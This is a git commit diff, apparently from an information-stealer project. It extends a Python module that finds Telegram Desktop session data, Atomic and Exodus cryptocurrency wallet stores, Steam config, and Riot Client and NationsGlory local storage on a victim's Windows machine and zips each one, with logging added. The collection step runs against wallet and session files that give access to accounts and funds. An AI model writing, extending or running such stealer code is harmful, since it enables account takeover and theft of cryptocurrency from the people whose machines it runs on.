e2f78afa90d651f70032d5ed78a032cea4e43763
Hirusha Adikari <36286877+hirusha-adi@users.noreply.github.com>
2023-11-29 17:35:38 +0530

    print stuff to console + log file + zip more directories

--- modules/applications/zip.py
+++ modules/applications/zip.py
@@ -28,27 +28,43 @@ class ZipFiles(ModuleManager):
         
         self.pathList = [
             ["Telegram Desktop", f"{Constant.roaming_dir}\\Telegram Desktop\\tdata", "TelegramDesktop.zip", ['cache', 'media_cache', 'emoji']],
+            ["Atomic Wallet", f"{Constant.roaming_dir}\\tomic\\Local Storage\\leveldb", "AtomicWallet.zip", []],
+            ["Exodus", f"{Constant.roaming_dir}\\Exodus\\exodus.wallet", "Exodus.zip", []],
+            ["Steam", "C:\\Program Files (x86)\\Steam\\config", "Steam.zip", []],
+            ["NationsGlory", f"\\NationsGlory\\Local Storage\\leveldb", "NationsGlory.zip", []],
+            ["NationsGlory", f"{Constant.roaming_dir}\\NationsGlory\\Local Storage\\leveldb", "NationsGlory.zip", []],
+            ["RiotClient", f"{Constant.local_dir}\\Riot Games\\Riot Client\\Data", "RiotClient.zip", []],
         ]
             
-    def zipApplication(self, pathToZip, outputFileName, excludeDirs, ) -> None:
-        try:
-            with ZipFile(os.path.join(self.zip_folder, outputFileName), 'w') as zipf:
-                for foldername, subfolders, filenames in os.walk(pathToZip):
-                    subfolders[:] = [d for d in subfolders if d not in excludeDirs]
+    def zipApplication(self, pathToZip, outputFileName, excludeDirs) -> None:
+        save_location = os.path.join(self.zip_folder, outputFileName)
+        with ZipFile(save_location, 'w') as zipf:
+            for foldername, subfolders, filenames in os.walk(pathToZip):
+                subfolders[:] = [d for d in subfolders if d not in excludeDirs]
 
-                    for filename in filenames:
-                        file_path = os.path.join(foldername, filename)
-                        arcname = os.path.relpath(file_path, pathToZip)
-                        zipf.write(file_path, arcname)
+                for filename in filenames:
+                    file_path = os.path.join(foldername, filename)
+                    arcname = os.path.relpath(file_path, pathToZip)
+                    zipf.write(file_path, arcname)
 
-            print(f"Successfully zipped {pathToZip} to {outputFileName}")
-        except Exception as e:
-            print(f"Error: {e}")
+        self.mdebug(f"Successfully zipped {pathToZip} to {save_location}")
+        
 
     def run(self) -> None:
+        self.mdebug(f"Starting to zip important files")
         for app in self.pathList:
-            self.zipApplication(
-                pathToZip=app[1],
-                outputFileName=app[2],
-                excludeDirs=app[3]
-            )
+            try:
+                if not os.path.isdir(app[1]):
+                    self.merror(f"Cannot find the installation of: {app[0]} at default location: {app[1]}. Continuing...")
+                    continue
+
+                self.mdebug(f"Running `zipApplication()` for {app[0]} at {app[1]}; Saving to {app[2]}; Excluding: `{app[3]}`")
+                self.zipApplication(
+                    pathToZip=app[1],
+                    outputFileName=app[2],
+                    excludeDirs=app[3]
+                )
+                self.mprint(f"Zipped: {app[0]} found at: {app[1]}")
+            except Exception as e:
+                self.merror(f"Unable to zip {app[0]}: {e}")
+
---
+++ test2.py
@@ -0,0 +1,1 @@
+        pathC = path + arg
